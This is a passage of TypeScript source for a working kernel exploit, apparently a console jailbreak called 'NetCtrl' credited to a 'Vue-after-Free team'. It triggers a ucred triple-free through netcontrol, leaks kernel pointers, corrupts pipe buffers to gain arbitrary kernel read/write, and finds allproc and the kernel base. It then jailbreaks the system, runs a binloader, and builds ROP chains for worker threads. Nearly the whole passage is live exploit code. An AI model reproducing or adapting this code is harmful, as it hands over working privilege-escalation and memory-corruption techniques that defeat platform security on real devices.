  exploit_count = 0
  exploit_end = false
  yield_to_render(exploit_phase_trigger)
}

function exploit_phase_trigger () {
  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
    log('Failed to acquire kernel R/W')
    cleanup()
    return
  }

  exploit_count++
  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')

  if (!trigger_ucred_triplefree()) {
    yield_to_render(exploit_phase_trigger)
    return
  }

  log('Leaking kqueue...')
  yield_to_render(exploit_phase_leak)
}

function exploit_phase_leak () {
  if (!leak_kqueue()) {
    yield_to_render(exploit_phase_trigger)
    return
  }

  log('Setting up arbitrary R/W...')
  yield_to_render(exploit_phase_rw)
}

function exploit_phase_rw () {
  setup_arbitrary_rw()
  log('Jailbreaking...')
  yield_to_render(exploit_phase_jailbreak)
}

function exploit_phase_jailbreak () {
  jailbreak()
}

function setup_arbitrary_rw () {
  // Leak fd_files from kq_fdp.
  const fd_files = kreadslow64(kq_fdp)
  fdt_ofiles = fd_files.add(0x00)
  debug('fdt_ofiles: ' + hex(fdt_ofiles))

  master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
  debug('master_r_pipe_file: ' + hex(master_r_pipe_file))

  victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
  debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file))

  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00))
  debug('master_r_pipe_data: ' + hex(master_r_pipe_data))

  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00))
  debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))

  // Corrupt pipebuf of masterRpipeFd.
  write32(master_pipe_buf.add(0x00), 0)                // cnt
  write32(master_pipe_buf.add(0x04), 0)                // in
  write32(master_pipe_buf.add(0x08), 0)                // out
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE)        // size
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data)  // buffer

  const ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)

  if (ret_write.eq(BigInt_Error)) {
    cleanup()
    throw new Error('Netctrl failed - Reboot and try again')
  }

  // Increase reference counts for the pipes.
  fhold(fget(master_pipe[0]))
  fhold(fget(master_pipe[1]))
  fhold(fget(victim_pipe[0]))
  fhold(fget(victim_pipe[1]))

  // Remove rthdr pointers from twins
  remove_rthr_from_socket(ipv6_socks[triplets[0]])
  remove_rthr_from_socket(ipv6_socks[triplets[1]])

  // Remove triple freed file from free list
  remove_uaf_file()

  for (let i = 0; i < 0x20; i = i + 8) {
    const readed = kread64(master_r_pipe_data.add(i))
    debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed))
  }

  log('Arbitrary R/W achieved')

  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
}

function find_allproc () {
  pipe(pipe_sock)
  const pipe_0 = read32(pipe_sock)
  const pipe_1 = read32(pipe_sock.add(0x04))

  write32(sockopt_val_buf, Number(getpid()))
  ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)

  const fp = fget(pipe_0)
  const f_data = kread64(fp.add(0x00))
  const pipe_sigio = kread64(f_data.add(0xd0))
  let p = kread64(pipe_sigio)
  kernel.addr.curproc = p // Set global curproc

  while (!(p.and(new BigInt(0xFFFFFFFF, 0x00000000))).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
    p = kread64(p.add(0x08)) // p_list.le_prev
  }

  close(new BigInt(pipe_1))
  close(new BigInt(pipe_0))

  return p
}

function jailbreak () {
  if (!kernel_offset) {
    throw new Error('Kernel offsets not loaded')
  }
  if (FW_VERSION === null) {
    throw new Error('FW_VERSION is null')
  }
  kernel.addr.allproc = find_allproc() // Set global allproc
  debug('allproc: ' + hex(kernel.addr.allproc))

  // Calculate kernel base
  kernel.addr.base = kl_lock.sub((kernel_offset as { KL_LOCK: number }).KL_LOCK)
  log('Kernel base: ' + hex(kernel.addr.base))

  jailbreak_shared(FW_VERSION)

  log('Jailbreak Complete - JAILBROKEN')
  utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom')

  cleanup(false) // Close sockets and kill workers on success
  show_success()
  run_binloader()
}

function fhold (fp: BigInt) {
  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1) // f_count
}

function fget (fd: number) {
  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
}

function remove_rthr_from_socket (fd: number) {
  // In case last triplet was not found in kwriteslow
  // At this point we don't care about twins/triplets
  if (fd > 0) {
    const fp = fget(fd)
    const f_data = kread64(fp.add(0x00))
    const so_pcb = kread64(f_data.add(0x18))
    const in6p_outputopts = kread64(so_pcb.add(0x118))
    kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
  }
}

const victim_pipe_buf = malloc(PIPEBUF_SIZE)

function corrupt_pipe_buf (cnt: number, _in: number, out: number, size: number, buffer: BigInt) {
  if (buffer.eq(0)) {
    throw new Error('buffer cannot be zero')
  }
  write32(victim_pipe_buf.add(0x00), cnt)      // cnt
  write32(victim_pipe_buf.add(0x04), _in)       // in
  write32(victim_pipe_buf.add(0x08), out)      // out
  write32(victim_pipe_buf.add(0x0C), size)     // size
  write64(victim_pipe_buf.add(0x10), buffer)   // buffer
  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE)

  // Debug
  /*
    read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
    for (const i=0; i<PIPEBUF_SIZE; i=i+8) {
        const readed = read64(victim_pipe_buf.add(i));
        debug("corrupt_read: " + hex(readed) );
    }
        */

  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE)
}

function kwrite (dest: BigInt, src: BigInt, n: number) {
  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest)
  return write(new BigInt(victimWpipeFd), src, n)
}

function kread (dest: BigInt, src: BigInt, n: number) {
  debug('Enter kread for src: ' + hex(src))
  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src)
  // Debug
  read(new BigInt(victimRpipeFd), dest, n)
  // for (const i=0; i<n; i=i+8) {
  //    const readed = read64(dest.add(i));
  // debug("kread_read: " + hex(readed) );
  // }
}

function kwrite64 (addr: BigInt, val: BigInt) {
  write64(tmp, val)
  kwrite(addr, tmp, 8)
}

function kwrite32 (addr: BigInt, val: number) {
  write32(tmp, val)
  kwrite(addr, tmp, 4)
}

function kread64 (addr: BigInt) {
  kread(tmp, addr, 8)
  return read64(tmp)
}

function kread32 (addr: BigInt) {
  kread(tmp, addr, 4)
  return read32(tmp)
}

function read_buffer (addr: BigInt, len: number) {
  const buffer = new Uint8Array(len)
  for (let i = 0; i < len; i++) {
    buffer[i] = Number(read8(addr.add(i)))
  }
  return buffer
}

function write_buffer (addr: BigInt, buffer: Uint8Array) {
  for (let i = 0; i < buffer.length; i++) {
    write8(addr.add(i), buffer[i]!)
  }
}

// Functions used in global kernel.js
// buf is Uint8Array()
kernel.read_buffer = function (kaddr, len) {
  kread(tmp, kaddr, len)
  return read_buffer(tmp, len)
}

kernel.write_buffer = function (kaddr, buf) {
  write_buffer(tmp, buf)
  kwrite(kaddr, tmp, buf.length)
}

function remove_uaf_file () {
  if (uaf_socket === undefined) {
    throw new Error('uaf_socket is undefined')
  }
  const uafFile = fget(uaf_socket)
  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0))
  let removed = 0
  for (let i = 0; i < 0x1000; i++) {
    const s = Number(socket(AF_UNIX, SOCK_STREAM, 0))
    if (fget(s).eq(uafFile)) {
      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0))
      removed++
    }
    close(new BigInt(s))
    if (removed === 3) {
      break
    }
  }
}

function trigger_ucred_triplefree () {
  let end = false

  write64(msgIov.add(0x0), 1) // iov_base
  write64(msgIov.add(0x8), 1) // iov_len

  let main_count = 0 // Let's do up to 8 iterations

  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++

    // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
    const dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0)

    // Register dummy socket.
    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)))
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8)

    // Close the dummy socket.
    close(new BigInt(dummy_socket))

    // Allocate a new ucred.
    setuid(1)

    // Reclaim the file descriptor.
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0))

    // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
    setuid(1)

    // Unregister dummy socket and free the file and ucred.
    write32(nc_clear_buf, uaf_socket)
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8)

    // Set cr_refcnt back to 1.
    for (let i = 0; i < 32; i++) {
      // Reclaim with iov.
      trigger_iov_recvmsg()
      sched_yield()
      // Release buffers.
      write(new BigInt(iov_sock_1), tmp, 1)
      wait_iov_recvmsg()
      read(new BigInt(iov_sock_0), tmp, 1)
    }

    // Double free ucred.
    // Note: Only dup works because it does not check f_hold.
    close(dup(new BigInt(uaf_socket)))

    // debug("Finding Twins...");
    // Find twins.
    end = find_twins()

    if (!end) {
      // Clean up and start again
      close(new BigInt(uaf_socket))
      continue
    }

    log('Triple freeing...')

    // Free one.
    free_rthdr(ipv6_socks[twins[1]])

    let count = 0

    // Set cr_refcnt back to 1.
    while (count < 10000) {
      // Reclaim with iov.
      trigger_iov_recvmsg()
      sched_yield()

      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8)

      if (read32(leak_rthdr) === 1) {
        break
      }

      // Release iov spray.
      write(new BigInt(iov_sock_1), tmp, 1)
      wait_iov_recvmsg()
      read(new BigInt(iov_sock_0), tmp, 1)
      count++
    }

    if (count === 1000) {
      log('Dropped out from reclaim loop')
      // Clean up and start again
      close(new BigInt(uaf_socket))
      continue
    }

    triplets[0] = twins[0]

    // Triple free ucred.
    close(dup(new BigInt(uaf_socket)))

    // Find triplet.
    triplets[1] = find_triplet(triplets[0], -1)

    // If error start again to better exploit possibility
    if (triplets[1] === -1) {
      log("Couldn't find triplet 1")
      // Clean up and start again
      // Release iov spray.
      // if we break on 'read32(leak_rthdr) == 1', we never released workers
      write(new BigInt(iov_sock_1), tmp, 1)
      close(new BigInt(uaf_socket))
      // Start again
      end = false
      continue
    }

    // Release iov spray.
    // if we break on 'read32(leak_rthdr) == 1', we never released workers
    write(new BigInt(iov_sock_1), tmp, 1)

    // Find triplet.
    triplets[2] = find_triplet(triplets[0], triplets[1])

    // If error start again to better exploit possibility
    if (triplets[2] === -1) {
      log("Couldn't find triplet 2")
      // Clean up and start again
      close(new BigInt(uaf_socket))
      // Start again
      end = false
      continue
    }

    // Wait iov release completition
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
  }

  if (main_count === TRIPLEFREE_ITERATIONS) {
    log('Failed to Triple Free')
    return false
  }
  return true
}

function leak_kqueue () {
  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
  debug('Leaking kqueue...')

  // Free one. From this point we are going to use only twins
  free_rthdr(ipv6_socks[triplets[2]])

  // Leak kqueue.
  let kq = new BigInt(0)

  // Minimizing footprint
  const magic_val = new BigInt(0x0, 0x1430000)
  const magic_add = leak_rthdr.add(0x08)

  let count = 0
  while (count < KQUEUE_ITERATIONS) {
    kq = kqueue()

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)

    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
      break
    }

    close(kq)
    count++
  }
  if (count === KQUEUE_ITERATIONS) {
    // Dropped out with no kqueue leak
    log('Failed to leak kqueue_fdp')
    return false
  }

  // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset

  kl_lock = read64(leak_rthdr.add(0x60))
  kq_fdp = read64(leak_rthdr.add(0x98))

  if (kq_fdp.eq(0)) {
    log('Failed to leak kqueue_fdp')
    return false
  }

  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock))

  // for (i=0; i<0x100; i=i+8) {
  //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
  // }

  // Close kqueue to free buffer.
  close(kq)

  // Find triplet.
  // No need we discarded triplets[2] and we only use twins from now on
  // triplets[1] = find_triplet(triplets[0], -1);

  return true
}

function kreadslow64 (address: BigInt) {
  const buffer = kreadslow(address, 8)
  // debug("Buffer from kreadslow: " + hex(buffer));
  if (buffer.eq(BigInt_Error)) {
    cleanup()
    throw new Error('Netctrl failed - Reboot and try again')
  }
  return read64(buffer)
}

function build_uio (uio: BigInt, uio_iov: BigInt, uio_td: number, read: boolean, addr: BigInt, size: number) {
  write64(uio.add(0x00), uio_iov)        // uio_iov
  write64(uio.add(0x08), UIO_IOV_NUM)    // uio_iovcnt
  write64(uio.add(0x10), BigInt_Error)   // uio_offset
  write64(uio.add(0x18), size)           // uio_resid
  write32(uio.add(0x20), UIO_SYSSPACE)   // uio_segflg
  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ) // uio_segflg
  write64(uio.add(0x28), uio_td)         // uio_td
  write64(uio.add(0x30), addr)           // iov_base
  write64(uio.add(0x38), size)           // iov_len
}

function kreadslow (addr: BigInt, size: number) {
  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)

  // Prepare leak buffers.
  const leak_buffers = new Array(UIO_THREAD_NUM)
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    leak_buffers[i] = malloc(size)
  }

  // Set send buf size.
  write32(sockopt_val_buf, size)
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)

  // Fill queue.
  write(new BigInt(uio_sock_1), tmp, size)

  // Set iov length
  write64(uioIovRead.add(0x08), size)

  // Free one.
  free_rthdr(ipv6_socks[triplets[1]])

  // Minimize footprint
  const uio_leak_add = leak_rthdr.add(0x08)

  let count = 0
  // Reclaim with uio.
  while (count < 10000) {
    count++
    trigger_uio_writev() // COMMAND_UIO_READ in fl0w's
    sched_yield()

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)

    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      // debug("Break on reclaim with uio");
      break
    }

    // Wake up all threads.
    read(new BigInt(uio_sock_0), tmp, size)

    for (let i = 0; i < UIO_THREAD_NUM; i++) {
      read(new BigInt(uio_sock_0), leak_buffers[i], size)
    }

    wait_uio_writev()

    // Fill queue.
    write(new BigInt(uio_sock_1), tmp, size)
  }

  if (count === 10000) {
    debug('kreadslow - Failed')
    return BigInt_Error
  }

  const uio_iov = read64(leak_rthdr)
  // debug("This is uio_iov: " + hex(uio_iov));

  // Prepare uio reclaim buffer.
  build_uio(msgIov, uio_iov, 0, true, addr, size)

  // Find new one to free
  triplets[1] = find_triplet(triplets[0], -1, 1000)

  if (triplets[1] === -1) {
    debug('kreadslow - Failed to adquire twin')
    return BigInt_Error
  }

  // Free second one.
  free_rthdr(ipv6_socks[triplets[1]])

  // Minimize footprint
  const iov_leak_add = leak_rthdr.add(0x20)

  // Reclaim uio with iov.
  while (true) {
    // Reclaim with iov.
    trigger_iov_recvmsg()
    sched_yield()

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)

    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      // debug("Break on reclaim uio with iov");
      break
    }

    // Release iov spray.
    write(new BigInt(iov_sock_1), tmp, 1)
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
  }

  // Wake up all threads.
  read(new BigInt(uio_sock_0), tmp, size)
  // Read the results now.
  let leak_buffer: BigInt = new BigInt(0)

  const tag_val = new BigInt(0x41414141, 0x41414141)

  // Get leak.
  // debug("Before getting leak");
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    read(new BigInt(uio_sock_0), leak_buffers[i], size)
    const val = read64(leak_buffers[i])
    // debug("I read from leak_buffers[" + i + "] : " + hex(val) );
    if (!val.eq(tag_val)) {
      // Find triplet.
      triplets[1] = find_triplet(triplets[0], -1, 1000)
      if (triplets[1] === -1) {
        debug('kreadslow - Failed to adquire twin 2')
        return BigInt_Error
      }
      leak_buffer = leak_buffers[i].add(0)
      // debug("This is leak_buffer " + hex(leak_buffer) + " - " + hex(read64(leak_buffer)));
    }
  }
  // debug("After getting leak");
  // Workers should have finished earlier no need to wait
  wait_uio_writev()

  // Release iov spray.
  write(new BigInt(iov_sock_1), tmp, 1)

  // Find triplet.
  // triplets[2] = find_triplet(triplets[0], triplets[1], 500);

  // Let's make sure that they are indeed triplets
  // const leak_0 = malloc(8);
  // const leak_1 = malloc(8);
  // const leak_2 = malloc(8);

  // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
  // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
  // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);

  // debug("This are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );

  // Workers should have finished earlier no need to wait
  wait_iov_recvmsg()
  read(new BigInt(iov_sock_0), tmp, 1)

  return leak_buffer
}

function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)

  // Set send buf size.
  write32(sockopt_val_buf, size)
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)

  // Set iov length.
  write64(uioIovWrite.add(0x08), size)

  // Free first triplet.
  free_rthdr(ipv6_socks[triplets[1]])

  // Minimize footprint
  const uio_leak_add = leak_rthdr.add(0x08)

  // Reclaim with uio.
  while (true) {
    trigger_uio_readv() // COMMAND_UIO_WRITE in fl0w's
    sched_yield()

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)

    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      // debug("Break on reclaim with uio");
      break
    }

    // Wake up all threads.
    for (let i = 0; i < UIO_THREAD_NUM; i++) {
      write(new BigInt(uio_sock_1), buffer, size)
    }

    wait_uio_readv()
  }

  const uio_iov = read64(leak_rthdr)
  // debug("This is uio_iov: " + hex(uio_iov));

  // Prepare uio reclaim buffer.
  build_uio(msgIov, uio_iov, 0, false, addr, size)

  // Find new one to free
  triplets[1] = find_triplet(triplets[0], -1, 1000)

  if (triplets[1] === -1) {
    debug('kwriteslow - Failed to adquire twin')
    return BigInt_Error
  }

  // Free second one.
  free_rthdr(ipv6_socks[triplets[1]])

  // Minimize footprint
  const iov_leak_add = leak_rthdr.add(0x20)

  // Reclaim uio with iov.
  while (true) {
    // Reclaim with iov.
    trigger_iov_recvmsg()
    sched_yield()

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)

    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      // debug("Break on reclaim uio with iov");
      break
    }

    // Release iov spray.
    write(new BigInt(iov_sock_1), tmp, 1)
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
  }

  // Corrupt data.
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    write(new BigInt(uio_sock_1), buffer, size)
  }

  // Find triplet.
  triplets[1] = find_triplet(triplets[0], -1, 1000)

  // Workers should have finished earlier no need to wait
  wait_uio_writev()

  // Release iov spray.
  write(new BigInt(iov_sock_1), tmp, 1)

  // Find triplet.
  // triplets[2] = find_triplet(triplets[0], triplets[1], 500);

  // Workers should have finished earlier no need to wait
  wait_iov_recvmsg()
  read(new BigInt(iov_sock_0), tmp, 1)

  return new BigInt(0)
}

function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
  let new_rop_entry = last_rop_entry.add(8)
  let copy_entry = last_rop_entry.sub(number_entries * 8).add(8)   // We add 8 to have the first ROP instruction add
  const rop_loop = last_rop_entry.sub(number_entries * 8).add(8)     // We add 8 to have the first ROP instruction add

  for (let i = 0; i < number_entries; i++) {
    const entry_add = copy_entry
    const entry_val = read64(copy_entry)

    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET)
    write64(new_rop_entry.add(0x8), entry_add)
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET)
    write64(new_rop_entry.add(0x18), entry_val)
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

    copy_entry = copy_entry.add(8)
    new_rop_entry = new_rop_entry.add(0x28)
  }

  // Time to jump back
  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET)
  write64(new_rop_entry.add(0x8), rop_loop)
}

function spawn_thread (rop_array: BigInt[], loop_entries: number, predefinedStack?: BigInt) {
  const rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600)

  // const rop_addr = malloc(size); // ROP Stack plus extra size

  // Fill ROP Stack
  for (let i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i]!)
    // debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
  }

  // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
  // loop_entries indicates the number of stack entries we need to regenerate
  if (loop_entries !== 0) {
    const last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8) // We pass the add of the last ROP instruction
    rop_regen_and_loop(last_rop_entry, loop_entries)
    // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
  }

  const jmpbuf = malloc(0x60)

  // FreeBSD amd64 jmp_buf layout:
  // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
  write64(jmpbuf.add(0x00), gadgets.RET)         // RIP - ret gadget
  write64(jmpbuf.add(0x10), rop_addr)      // RSP - pivot to ROP chain
  write32(jmpbuf.add(0x40), saved_fpu_ctrl) // FPU control
  write32(jmpbuf.add(0x44), saved_mxcsr)    // MXCSR

  const stack_size = new BigInt(0x100)
  const tls_size = new BigInt(0x40)

  const stack = malloc(Number(stack_size))
  const tls = malloc(Number(tls_size))

  write64(spawn_thr_args.add(0x00), longjmp_addr)       // start_func = longjmp
  write64(spawn_thr_args.add(0x08), jmpbuf)             // arg = jmpbuf
  write64(spawn_thr_args.add(0x10), stack)              // stack_base
  write64(spawn_thr_args.add(0x18), stack_size)         // stack_size
  write64(spawn_thr_args.add(0x20), tls)                // tls_base
  write64(spawn_thr_args.add(0x28), tls_size)           // tls_size
  write64(spawn_thr_args.add(0x30), spawn_tid)           // child_tid (output)
  write64(spawn_thr_args.add(0x38), spawn_cpid)               // parent_tid (output)

  const result = thr_new(spawn_thr_args, 0x68)
  // debug("thr_new result: " + hex(result));
  if (!result.eq(0)) {
    throw new Error('thr_new failed: ' + hex(result))
  }
  return read64(spawn_tid)
}

function iov_recvmsg_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
  const rop: BigInt[] = []

  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(1))                        // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)   // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(0x10))                     // setsize
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(1))         // RTP_SET
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  // recvmsg(iov_sock_0, msg, 0)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(iov_sock_0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(msg)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0))
  rop.push(recvmsg_wrapper)

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_end = rop.length
  const loop_size = loop_end - loop_init
  // It's gonna loop

  return {
    rop,
    loop_size
  }
}

function uio_readv_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
  const rop: BigInt[] = []

  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(1))                        // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)   // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(0x10))                     // setsize
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(1))         // RTP_SET
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  // readv(uio_sock_0, uioIovWrite, UIO_IOV_NUM);
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(uio_sock_0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(uioIovWrite)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(UIO_IOV_NUM))
  rop.push(readv_wrapper)

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_end = rop.length
  const loop_size = loop_end - loop_init
  // It's gonna loop

  return {
    rop,
    loop_size
  }
}

function uio_writev_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
  const rop: BigInt[] = []

  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(1))                        // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)   // id = -1 (current thread)
